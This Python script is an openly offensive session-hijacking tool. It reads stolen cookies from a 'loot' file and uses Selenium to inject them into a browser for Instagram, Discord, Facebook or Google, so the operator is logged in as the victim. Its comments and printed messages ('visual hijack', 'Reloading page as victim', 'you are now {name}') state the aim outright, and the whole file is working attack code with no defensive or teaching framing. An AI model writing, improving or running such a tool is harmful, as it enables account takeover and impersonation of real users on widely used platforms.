import os
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

LOOT_FILE = "loot/stolen_tokens.txt"

# Supported targets and their login domains
TARGET_SITES = {
    "1": ("Instagram", "https://www.instagram.com"),
    "2": ("Discord", "https://discord.com"),
    "3": ("Facebook", "https://www.facebook.com"),
    "4": ("Google", "https://www.google.com"),
}

def choose_target():
    print("\n[🎯] Choose a target to inject:")
    for key, (name, _) in TARGET_SITES.items():
        print(f"[{key}] {name}")
    choice = input("Your choice: ").strip()
    return TARGET_SITES.get(choice)

def load_cookies_for_domain(domain):
    cookies = []
    if not os.path.exists(LOOT_FILE):
        print("[!] No loot file found.")
        return cookies

    with open(LOOT_FILE, "r") as f:
        lines = f.readlines()
        for line in lines:
            if domain in line:
                try:
                    parts = line.strip().split("\t")
                    if len(parts) == 3:
                        cookie = {"domain": parts[0], "name": parts[1], "value": parts[2]}
                        cookies.append(cookie)
                except Exception as e:
                    print(f"[-] Failed to parse: {line}")
    return cookies

def run():
    target = choose_target()
    if not target:
        print("[!] Invalid choice.")
        return

    name, url = target
    domain = url.replace("https://", "").replace("www.", "").strip("/")

    print(f"\n[🧪] Launching browser for: {name}")
    cookies = load_cookies_for_domain(domain)
    if not cookies:
        print("[!] No cookies found for this domain.")
        return

    # Headed browser for visual hijack
    options = Options()
    options.add_argument("--user-agent=Mozilla/5.0")
    driver = webdriver.Chrome(options=options)

    # Load base URL and inject cookies
    driver.get(url)
    time.sleep(3)
    driver.delete_all_cookies()
    for cookie in cookies:
        try:
            driver.add_cookie({
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": "." + domain,
                "path": "/"
            })
            print(f"[+] Injected cookie: {cookie['name']}")
        except Exception as e:
            print(f"[!] Error injecting cookie {cookie['name']}: {e}")

    print("\n[💉] Session cookies injected. Reloading page as victim...")
    driver.get(url)

    print(f"[✅] If the cookies were valid, you are now {name}.")
    input("Press ENTER to close the browser...")
    driver.quit()

if __name__ == "__main__":
    run()
